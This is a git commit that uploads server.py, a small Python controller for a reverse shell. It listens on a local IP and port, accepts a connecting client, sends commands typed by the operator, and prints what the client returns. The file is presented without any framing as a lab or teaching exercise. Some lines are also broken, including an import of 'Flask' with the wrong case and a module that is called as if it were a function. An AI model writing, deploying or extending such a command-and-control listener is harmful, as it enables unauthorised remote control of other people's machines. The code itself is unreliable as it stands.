859a62f4d4c8e097526f38be05193eb23b9d93d7
Aayush Bhatt <138981035+aayush66991@users.noreply.github.com>
2023-11-30 14:54:41 +0530

    Add files via upload

---
+++ server.py
@@ -0,0 +1,40 @@
+import sys
+import socket
+from Flask import flask
+import Keep_Alive
+
+Keep_Alive()
+
+SERVER = "192.168.1.4"
+PORT = 8080
+
+s = socket.socket()
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((SERVER, PORT))
+
+s.listen(1)
+
+while True:
+    print(f'[*] Server listening to {SERVER}:{PORT}')
+
+    client = s.accept()
+    print(f'[+] client connected {client[1]}')
+
+    client[0].send('connected'.encode())
+    while True:
+        cmd = input('>>> ')
+        client[0].send(cmd.encode())
+
+        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
+            break
+
+        result = client[0].recv(1024).decode()
+        print(result)
+
+    client[0].close()
+
+    cmd = input('Wait for new client y/n ') or 'y'
+    if cmd.lower() in ['n', 'no']:
+        break
+
+s.close()
